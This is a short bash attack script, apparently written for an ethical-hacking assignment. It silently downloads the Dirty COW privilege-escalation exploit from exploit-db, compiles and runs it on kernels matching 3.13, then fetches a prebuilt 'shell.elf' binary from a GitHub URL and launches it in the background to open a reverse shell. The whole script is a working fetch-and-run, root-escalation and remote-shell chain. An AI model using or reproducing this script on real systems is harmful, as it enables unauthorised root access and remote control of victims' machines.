#!/bin/bash

OS="$(uname -r)"
SHELL_FILE="/tmp/shell.elf"
COW_C_FILE="/tmp/dirtycow.c"
COW_FILE="/tmp/dirtycow"

main() {
    # If the user is not root, run dirtycow exploit
    if [[ "$EUID" -ne 0 ]]; then
        echo "Not Root!"
        case $OS in
        *3.13*) dirtycow ;;
        esac
    fi
    open_reverse_shell
}

dirtycow() {
    echo "Running Dirty cow"
    if [[ ! -f "$COW_FILE" ]]; then
        wget -O "$COW_C_FILE" 'https://www.exploit-db.com/download/40616' >/dev/null 2>&1
        gcc "$COW_C_FILE" -o "$COW_FILE" -pthread >/dev/null 2>&1
    fi
    ("$COW_FILE" || true)
    if [[ "$EUID" -ne 0 ]]; then
        echo "Root not attained"
    fi
}

open_reverse_shell() {
    if [[ ! -f "$SHELL_FILE" ]]; then
        wget -O "$SHELL_FILE" 'https://github.com/yadunut/EH-Assignment/raw/master/shell.elf'
    fi
    chmod +x "$SHELL_FILE"
    $SHELL_FILE &
}

main
